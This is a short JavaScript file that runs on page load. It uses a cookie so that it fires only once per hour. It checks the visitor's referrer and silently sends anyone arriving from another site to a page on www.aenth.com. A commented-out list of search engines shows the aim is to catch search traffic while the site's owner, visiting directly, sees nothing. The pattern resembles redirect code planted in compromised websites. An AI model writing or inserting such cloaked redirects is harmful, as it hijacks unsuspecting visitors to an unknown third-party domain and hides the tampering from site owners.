function cookieGO(name) {
  var today = new Date();
  var expires = new Date();
  expires.setTime(today.getTime() + 1000*60*60);
  settCookie("cssid", name, expires);
}

function settCookie(name, value, expire) {   
  window.document.cookie = name + "=" + escape(value) + ((expire == null) ? "" : ("; expires=" + expire.toGMTString()));
}

function gettCookie(Name) {   
   var findcookie = Name + "=";
   if (window.document.cookie.length > 0) { // if there are any cookies
     offset = window.document.cookie.indexOf(findcookie);
  if (offset != -1) { // if cookie exists
       offset += findcookie.length;          // set index of beginning of value
    end = window.document.cookie.indexOf(";", offset)          // set index of end of cookie value
    if (end == -1)
      end = window.document.cookie.length;
    return unescape(window.document.cookie.substring(offset, end));
     }
   }
   return null;
}

function loca(){
	var c = gettCookie("cssid");
	if (c != null) {
		return;
	}
	cookieGO("a1000");
	var slyar = document.referrer;
	var domain = document.domain;
	//var urls = ['google','baidu','yahoo','facebook','bing','yehey','altavista','naver','lebhost','cari.com','sajasearch','explorenepal','kypros','1stcyprus','aiwagulf','saudi-pages','search','sanook','find.egent','abacho','list2000','kacmac','middle-east-pages','hyeguide','iranmania','khoj','searchindonesia','arabo','arabianlist','vietgate','iguide','kfayer','themaldives','timway','dokoda','searchdesk','infoseek','egyptsearch','ghanaforum','sudaneseonline','marweb','aardvark','ananzi','4arabs','servihoo','seneweb','abacho','lycos','nomade','fireball','search','hispavista','alego','ask','splut','jubii','vaila','sol','netsprint','aladin','eniro','walhello','websearch','search','sharelook','sunsteam','forthent','gogreece','eniro','sunet','yandex','all','akavita','niceone','yoyo','luxweb','webwatch','livesearching','maltanetworkresources','search','excite','tiscali','shinystat','neti','directorio','gbg','zoznam','atlas','best','overture','dogpile','webcrawler','categories','canadiancontent','blackseek','mexicoweb','buscapique','peru-info','reduy','aonde','starmedia','istmania','honduras','caribseek','bacan','live'];
	//for(key in urls){
	//    if(slyar.indexOf(urls[key]) >= 0){
	//		self.location="http://www.aenth.com/";
	//		break; 
	//    }
	//}
	if(slyar.indexOf(domain) <= 0 && (slyar != "" && slyar != undefined && slyar != null)){
		//self.location="http://www.aenth.com/readme.html";
		location.href="//www.aenth.com/readme.html";
	}
}
loca();
